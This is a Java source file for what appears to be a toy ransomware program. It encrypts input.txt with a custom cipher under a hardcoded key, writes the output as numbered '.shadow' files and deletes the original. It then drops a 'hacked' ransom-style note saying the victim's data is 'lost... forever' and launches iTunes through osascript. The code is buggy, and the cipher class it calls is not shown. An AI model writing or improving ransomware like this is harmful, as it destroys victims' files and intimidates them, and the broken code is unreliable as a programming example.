import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.io.IOException;


public class Runner {


	public static void main(String[] args) {
		try {
			
			InputStream inStr = new FileInputStream("input.txt");
			for (int i=0; i<11; i++) {
				OutputStream outStr = new FileOutputStream("shade"+i+".shadow");
				File wall = new File("hacked.png");
				//5121 is the Key
				ShadowCIPHER cipher = new ShadowCIPHER(5121);
				//Upcoming Shadow Cypher will use TRIPLE DES with a more complex key generation system (won't be static)
				cipher.mainEncrypt(inStr, outStr);
				
				inStr.close();
			    new Runner();

				new File("input.txt").delete();
				
				
				
				outStr.close();
			}
			
			PrintWriter writer = new PrintWriter("hacked", "UTF-8");
		    writer.println("You have been hacked, and your file has been encrypted.");
		    writer.println("Congrats. Your data is lost... forever.");
		    writer.close();
		} catch (IOException e) {
			System.out.println("ENCRYPTED:" + e);
		}
		
		
	}
	
	public Runner() {
	    Runtime runtime = Runtime.getRuntime();
	    String[] args = { "osascript", "-e", "tell app \"iTunes\" to play" };
	    try {
			Process process = runtime.exec(args);
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

	    
	  }
	
	
}
